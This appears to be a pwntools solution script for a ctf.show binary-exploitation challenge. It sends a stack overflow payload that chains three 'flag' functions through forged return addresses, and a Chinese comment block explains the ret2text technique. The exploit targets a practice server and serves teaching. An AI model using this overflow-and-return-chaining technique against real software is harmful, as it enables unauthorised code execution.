from pwn import *

p = remote('pwn.challenge.ctf.show', 28103)

offset = 0x2C + 4

flag_addr = 0x8048606
flag2_addr = 0x804859D
flag1_addr = 0x8048586

payload = b'a' * offset + p32(flag1_addr) + p32(flag2_addr) + p32(flag_addr) + p32(0xACACACAC) + p32(0xACACACAC)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 多函数连续调用
2. 核心思路：
   - 程序有多个flag函数，需要按顺序调用
   - 在栈上构造多个返回地址，实现链式调用
3. payload结构：
   b'a' * offset     - 填充到返回地址
   + p32(flag1_addr) - 第一个flag函数
   + p32(flag2_addr) - flag1返回后调用flag2
   + p32(flag_addr)  - flag2返回后调用flag3
   + p32(0xACACACAC) - flag3的参数1
   + p32(0xACACACAC) - flag3的参数2
4. 执行流程：
   - 溢出后跳转到flag1
   - flag1执行完，从栈上取返回地址，跳转到flag2
   - flag2执行完，跳转到flag3
   - flag3执行，使用栈上的参数
5. 参数值0xACACACAC：
   - 可能是题目要求的特定值
   - 或者是flag3函数的内部检查条件
6. 关键点：栈上构造函数调用链
"""
